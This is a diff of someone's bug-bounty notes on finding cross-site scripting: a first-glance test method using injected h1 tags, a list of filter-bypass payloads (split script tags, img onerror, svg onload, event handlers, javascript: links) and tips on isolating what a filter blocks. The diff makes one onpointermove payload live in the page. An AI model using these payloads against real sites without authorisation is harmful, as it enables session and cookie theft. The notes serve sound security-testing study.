@@ -1,6 +1,6 @@
 <h1>Cross Site Scriping</h1>
 <br>
-**first glance methodology**
+<h2>first glance methodology </h2>
 On a website that allows you to register an account, test every feature avaliable with the payload <.h1>test<./h1>(remove the . it was rendering my h1 tag on this page). Do this on every feature that allows input. <br>
 Navigate the application and see if theres any places your H1 tag is interpreted. <br>
 View the page source and quickly filter for test and see what encoding is in place on your input. <br>
@@ -18,14 +18,14 @@ You dont need a popup for a POC, you can go straight to a cookie stealer POC. <b
 <br>
 **XSS Filter Bypasses** <br>
 Remove . from all payloads
-Is <.script>alert(1)</script.> filtered? Try: <br>
+<code>Is <.script>alert(1)</script.> filtered? Try: <br>
 <scr<.script>ipt>alert(1)</scr</script.>ipt> <br>
 <.img src=x onerror=alert(1)> <br>
 <.svg/onload=alert(1)> <br>
-<.h1 id=x onpointermove=alert(1)>test<./h1> <br>
+<h1 id=x onpointermove=alert(1)>test</h1> <br>
 %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E <br>
 <.randomfaketag id=x onwheel=alert(1)><br>
-<.a href=javascript:alert(1)>click</a.><br>
+ <.a href=javascript:alert(1)>click</a.><br> </code>
 <br>
 **identify what is being blocked**
 Can you submit a <.h1> tag but if using xss payload its blocked? Write out the xss payload removing elements at a time? maybe it gets blocked on alert(1) - if so use the alert bypass. Maybe it gets blocked on the event handler? If so copy event handlers to file and use on intruder to see what is allowed? <br>
